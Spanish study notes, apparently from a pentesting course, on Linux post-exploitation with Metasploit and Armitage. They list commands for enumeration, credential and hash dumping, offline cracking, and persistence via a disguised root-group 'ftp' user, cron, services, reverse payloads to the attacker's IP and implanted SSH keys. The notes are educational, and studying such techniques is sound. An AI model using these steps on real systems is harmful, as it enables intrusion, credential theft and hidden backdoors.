----
# Post-explotación con Metasploit

Metasploit incluye módulos **post-explotación** para **Windows y Linux** que sirven para **enumerar**, **escalar privilegios**, **extraer credenciales**, **mantener persistencia** y **movimiento lateral**.
## Enumeración típica en Linux

- **Enumerate system configuration** → recopila configuración del sistema (OS, kernel, paquetes, paths críticos).
- **Enumerate environment variables** → enumera variables de entorno que pueden contener rutas, tokens o credenciales.
- **Enumerate network configuration** → obtiene información de red (interfaces, IPs, rutas, gateways).
- **Enumerate user history** → recupera historiales de comandos de usuarios y servicios.
- **VM check** → detecta si el sistema está corriendo dentro de una máquina virtual o contenedor.
## Meterpreter 

- **`getuid`** → muestra el usuario con el que se ejecuta la sesión actual.
- **`help`** → lista los comandos disponibles según el tipo de sesión.
- **`screenshot`** → captura la pantalla del usuario (solo si hay sesión gráfica activa).
- **`hashdump`** → extrae hashes de contraseñas (en Linux solo si es posible acceder a `/etc/shadow`).
- **`show_mount`** → lista sistemas de archivos montados y puntos de montaje.
- **`ps`** → muestra los procesos activos con PID y usuario.
- **`migrate <PID>`** → migra la sesión a otro proceso para estabilidad o evasión.
- **`background`** → envía la sesión a segundo plano y vuelve a `msfconsole`.

## Enumeración manual en Linux (desde shell)

- **`cat /etc/passwd`** → enumera usuarios del sistema.
- **`groups <usuario>`** → muestra los grupos a los que pertenece un usuario.
- **`cat /etc/*issue`** → identifica la distribución y versión del sistema.
- **`uname -r`** → muestra la versión del kernel.
- **`uname -a`** → muestra información completa del kernel y arquitectura.
- **`ifconfig` / `ip a s`** → enumera interfaces de red e IPs.
- **`netstat -antp`** → muestra puertos abiertos y procesos asociados.
- **`ps faux`** → lista procesos en formato árbol con argumentos completos.
- **`env`** → muestra variables de entorno del usuario actual.
## Módulos Post-explotación en Linux (Metasploit)

- **`search enum_configs`** → enumera archivos de configuración del sistema Linux (resultados en _loot_).
- **`search multi/gather/env`** → enumera variables de entorno y versión del sistema operativo (ej. Debian).
- **`search enum_network`** → obtiene información de red del sistema comprometido (se guarda en _loot_).
- **`search enum_protections`** → enumera protecciones del sistema (SELinux, AppArmor, etc., se guarda en _notes_).
- **`search enum_system`** → recopila información general del sistema (kernel, distro, arquitectura, _loot_).
- **`search checkcontainer`** → detecta si el sistema está ejecutándose dentro de un contenedor.
- **`search linux/gather/checkvm`** → detecta si el sistema corre en una máquina virtual.
- **`search enum_users_history`** → intenta recuperar historiales de comandos de usuarios y servicios (se guarda en _loot_ y puede contener contraseñas).
## Módulos de credenciales Linux 

- **`search ssh_creds`** → **(root recomendado)** busca credenciales SSH en archivos de configuración y directorios de usuarios (`.ssh`, `known_hosts`, configs).
- **`search docker_creds`** → **(root requerido)** extrae credenciales de Docker (`config.json`, variables, registros) que suelen estar en rutas protegidas.
- **`search hashdump`** → **(root obligatorio)** dumpea hashes de contraseñas desde `/etc/shadow` para cracking offline.
- **`search ecryptfs_creds`** → **(root requerido)** intenta obtener credenciales o claves de volúmenes cifrados con eCryptfs.
- **`search enum_psk`** → **(root requerido)** enumera claves pre-compartidas (PSK) usadas en VPNs o configuraciones de red.
- **`search enum_xchat`** → **(root NO obligatorio)** busca credenciales almacenadas en clientes de chat (xChat) dentro del perfil del usuario.
- **`search phpmyadmin_credsteal`** → **(root recomendado)** intenta robar credenciales de phpMyAdmin desde archivos de configuración web.
- **`search pptpd_chap_secrets`** → **(root obligatorio)** extrae usuarios y contraseñas del archivo `chap-secrets` de PPTP.
- **`search sshkey_persistence`** → **(root requerido)** instala claves SSH en `authorized_keys` para mantener acceso persistente al sistema.

---
# LINUX PRIVILEGE ESCALATION: EXPLOITING A VULNERABLE PROGRAM

La **escalada de privilegios en Linux** consiste en aprovechar **configuraciones débiles**, **binarios vulnerables** o **software desactualizado** para pasar de un usuario sin privilegios a **root**.
## Flujo básico tras ganar acceso 

- **`sessions -u <id>`** → actualiza una sesión shell a Meterpreter para disponer de más funcionalidades de post-explotación.
- **`ps aux`** → lista todos los procesos del sistema con usuario, PID y comandos ejecutados.
- **`ps faux`** → muestra los procesos en formato árbol para identificar relaciones padre-hijo sospechosas.
- **`checkrootkit -V`** → comprueba si `chkrootkit` está instalado y muestra su versión (útil para detectar versiones vulnerables).

📌 La presencia de **chkrootkit antiguo** es crítica: versiones vulnerables pueden permitir **ejecución de código como root**.
## Enumeración de binarios vulnerables con Metasploit

- **`search chkrootkit`** → busca módulos de Metasploit relacionados con vulnerabilidades en `chkrootkit`.

📌 Algunos exploits de `chkrootkit` se basan en:
- Scripts ejecutados como root vía **cron**
- Uso inseguro de binarios sin ruta absoluta
- Manipulación de variables de entorno (`PATH`)

---
# DUMPING HASHES WITH HASHDUMP (Linux)

El **dumping de hashes** consiste en extraer los **hashes de contraseñas** del sistema para su **cracking offline**.  
En **Linux**, los hashes se almacenan en **`/etc/shadow`**, archivo **solo accesible por root** o usuarios con privilegios equivalentes.

Metasploit permite **extraer los hashes** y **prepararlos** para cracking con herramientas como **John the Ripper** o **Hashcat**.
## Requisitos

- Acceso como **root** (o sesión con privilegios elevados).
- Sesión activa en Metasploit.
## Extracción de hashes con Metasploit 

- **`search linux/gather/hashdump`** → localiza el módulo post-explotación para dumpear hashes en Linux.
- **`use linux/gather/hashdump`** → carga el módulo de extracción de hashes.
- **`set SESSION <id>`** → indica la sesión con privilegios root.
- **`run`** → extrae los hashes desde `/etc/shadow`.
- **`loot`** → muestra los hashes y archivos recolectados por Metasploit.

📌 Los hashes extraídos suelen guardarse automáticamente en **loot** para uso posterior.
## Formato de hashes en Linux

- Normalmente aparecen como:
    - `$1$` → MD5
    - `$5$` → SHA-256
    - `$6$` → **SHA-512** (el más común actualmente)
## Cracking de hashes (offline)

### John the Ripper (unshadow)

- **`unshadow passwd shadow > hashes.txt`** → combina `/etc/passwd` y `/etc/shadow` para generar hashes crackeables.
- **`john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt`** → intenta romper los hashes usando diccionario.
### Hashcat (ejemplo)

- **`hashcat -m 1800 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt`** → crackea hashes Linux SHA-512 con diccionario.

📌 **`-m 1800`** corresponde a **Linux SHA-512 (`$6$`)**, que es el formato más habitual.

---
# ESTABLISHING PERSISTENCE ON LINUX:

La **persistencia** consiste en técnicas que permiten **mantener acceso al sistema** a través de reinicios, cambios de credenciales u otras interrupciones que podrían cortar el acceso inicial.  
No basta con comprometer un sistema una vez: **hay que poder volver a conectarse**.
## Flujo básico una vez ganado acceso (persistencia manual)

- **`/bin/bash -i`** → obtiene una shell interactiva estable para trabajar cómodamente.
- **`cat /etc/passwd`** → enumera usuarios del sistema para elegir un nombre creíble.
- **`useradd -m ftp -s /bin/bash`** → crea un usuario falso tipo servicio (verificar antes que no exista).
- **`passwd ftp`** → asigna contraseña al usuario creado.
- **`groups ftp`** → comprueba los grupos a los que pertenece el usuario.
- **`usermod -aG root ftp`** → añade el usuario `ftp` al grupo root (equivale a privilegios totales).
- **`usermod -u 15 ftp`** → cambia el UID para que parezca un usuario antiguo del sistema.

📌 Con esto podemos **conectarnos por SSH** usando un usuario que parece legítimo.
## Persistencia mediante CRON (Metasploit)

- **`search cron persistence`** → localiza módulos que crean persistencia mediante tareas programadas en Linux.
- **`set LPORT <puerto>`** → define el puerto al que el sistema se conectará de forma persistente.
- **`set LHOST <nuestra_ip>`** → IP del atacante que recibirá la conexión.
- **`set SESSION <id>`** → sesión activa donde se instalará la persistencia.
- **`run`** → crea la tarea cron persistente en el sistema.
## Persistencia como servicio Linux (Metasploit)

- **`search linux/local/service_persistent`** → localiza módulos que crean persistencia como servicio del sistema.
- **`set payload cmd/unix/reverse_python`** → define un payload ligero compatible con Linux.
- **`set LPORT <puerto>`** → puerto usado por la conexión reversa persistente.
- **`set LHOST <nuestra_ip>`** → IP del atacante.
- **`set SESSION <id>`** → sesión donde se instala el servicio.
- **`set TARGET <id>`** → selecciona el método de persistencia adecuado al sistema.
- **`run`** → instala el servicio persistente.
## Volver a conectarse al sistema persistido

- **`use multi/handler`** → prepara Metasploit para recibir conexiones entrantes.
- **`set payload linux/meterpreter/reverse_tcp`** → debe coincidir exactamente con el payload persistente.
- **`set LPORT <mismo_puerto>`** → mismo puerto usado al crear la persistencia.
- **`set LHOST <tu_ip>`** → IP del atacante.
- **`run`** → espera a que el sistema ejecute la persistencia y devuelva la sesión.
## Persistencia mediante clave SSH (RECOMENDADO)

- **`search sshkey_persistence`** → localiza el módulo que instala claves SSH persistentes.
- **`set CREATESSHFOLDER true`** → crea el directorio `.ssh` si no existe.
- **`set SESSION <id>`** → sesión sobre la que se instala la clave.
- **`exploit`** → añade la clave pública al archivo `authorized_keys`.
- **`loot`** → muestra y guarda la clave privada generada.
## Acceso posterior por SSH

- **`vim ssh_key`** → guarda la clave privada extraída.
- **`chmod 400 ssh_key`** → ajusta permisos requeridos por SSH. (tambien vale 600)
- **`ssh -i ssh_key root@<ip>`** → acceso persistente por SSH sin contraseña.

----
# PORT SCANNING AND ENUMERATION WITH ARMITAGE

**Armitage** es un **front-end gráfico (GUI) en Java** para **Metasploit Framework**, desarrollado para **simplificar el descubrimiento de red, la explotación y la post-explotación** mediante una interfaz visual.
## Funcionalidades principales

- **Visualizar targets** → muestra hosts comprometidos y no comprometidos de forma gráfica.
- **Automated port scanning** → ejecuta escaneos de puertos sin usar la consola manualmente.
- **Automated exploitation** → lanza exploits de forma guiada según servicios detectados.
- **Automated post-exploitation** → facilita acciones posteriores como credenciales, pivoting y persistencia.

📌 Armitage **depende de la base de datos de Metasploit** y de su backend para funcionar correctamente.
## Puesta en marcha (requisitos)

Abrimos **dos terminales**:

- **`service postgresql start`** → inicia la base de datos necesaria para Metasploit y Armitage.
- **`armitage`** → lanza la interfaz gráfica de Armitage.
- **`connect`** → conecta Armitage con el backend de Metasploit.
- **`yes`** → confirma el uso de la base de datos existente.
## Funcionamiento básico

- **Hosts → Add Host** → añade manualmente un host objetivo.
- **Click derecho sobre el host → Set Label** → asigna un nombre identificativo al objetivo.
- **Click derecho → Scan** → lanza escaneos automáticos contra el host.
- **Services** → muestra los servicios detectados tras el escaneo.
## Escaneo integrado con Nmap

- **Host → Nmap Scan → Quick Scan + OS** → ejecuta un escaneo rápido con detección de sistema operativo.
📌 Los resultados se almacenan en la base de datos y se usan para sugerir exploits.
## Uso de módulos manualmente

- **Buscar módulos** → se pueden localizar exploits y auxiliares manualmente desde la GUI.
- **Modificar variables** → permite configurar `RHOSTS`, `LHOST`, `PAYLOAD`, etc., sin usar `msfconsole`.
## Ataques y acceso

- **Click derecho sobre el host → Login → psexec** → intenta autenticarse/explotar usando credenciales conocidas en sistemas Windows.
- **Attack** → lanza ataques automáticos basados en servicios y vulnerabilidades detectadas.

---
# EXPLOITATION AND POST-EXPLOITATION WITH ARMITAGE

Armitage permite **explotar y post-explotar sistemas** de forma gráfica, simplificando el uso de Metasploit sin perder control sobre los módulos y parámetros.
## Explotación con Armitage — flujo básico (1 línea + explicación)

- **Buscar módulo (ej. `rejetto`)** → localiza el exploit adecuado según el servicio detectado (p. ej., HFS Rejetto).
- **`set LPORT 4444`** → define el puerto local para la conexión reversa del payload.
- **`set reverse_connection`** → configura el exploit para usar conexión reversa hacia el atacante.
- **`Attack`** → ejecuta el exploit contra el host seleccionado.

📌 Si el ataque tiene éxito, el host cambia de icono/color indicando compromiso.
## Uso de terminal en Armitage

- **Ventana de consola** → permite interactuar directamente con la sesión obtenida (shell o Meterpreter) sin salir de la GUI.
📌 Es equivalente a usar `msfconsole`, pero integrado en la interfaz gráfica.
## Post-explotación con Armitage (menú contextual)

### Desde el host comprometido (click derecho):

- **Meterpreter → Access → Dump Hashes** → extrae hashes de contraseñas del sistema (requiere privilegios altos).
- **Meterpreter → Persistence** → despliega opciones para mantener acceso persistente (servicios, tareas, claves, etc.).

📌 Armitage **agrupa módulos post-explotación** y los ejecuta con parámetros preconfigurados para agilizar el proceso.